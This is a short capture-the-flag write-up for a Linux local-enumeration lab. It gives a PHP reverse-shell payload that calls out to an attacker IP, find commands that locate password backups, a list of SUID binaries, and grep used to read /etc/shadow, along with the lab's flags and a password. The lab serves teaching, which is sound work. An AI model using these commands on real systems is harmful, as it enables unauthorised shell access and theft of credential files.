> Linux: Local Enumeration

Navigate to `http://$IP:3000/cmd.php` and paste this payload`php -r '$sock=fsockopen("10.8.107.21",12345);exec("/bin/sh -i <&3 >&3 2>&3");'` to get a reverse shell!

Looking at .bash_history we get a flag!

# Flag 1

```
thm{clear_the_history}
```

We have to search for a password and hint says that it is a backup so let's search for .bak.

`find / -type f -name *.bak 2>/dev/null`

```
/var/opt/passwords.bak => Looks like it and password is `THMSkidyPass`
/var/backups/shadow.bak
/var/backups/passwd.bak
/var/backups/gshadow.bak
/var/backups/group.bak
```

And the flag is hiiden in .conf file.

`find / -type f -name flag.conf 2>/dev/null`


# /etc/sysconf/flag.conf

```
# Begin system conf 1.1.1.0
## Developed by Swafox and Chad

flag: thm{conf_file}
```

# SUID Bit

`find / -type f -perm -u=s 2>/dev/null`

```
/bin/su
/bin/grep
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/umount
/bin/fusermount
/usr/bin/chsh
/usr/bin/arping
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
....
```

And grep I haven't seen much so I went with that. let's look for it in GTFO.

```
grep '' /etc/shadow
```

And we can read /etc/shadow.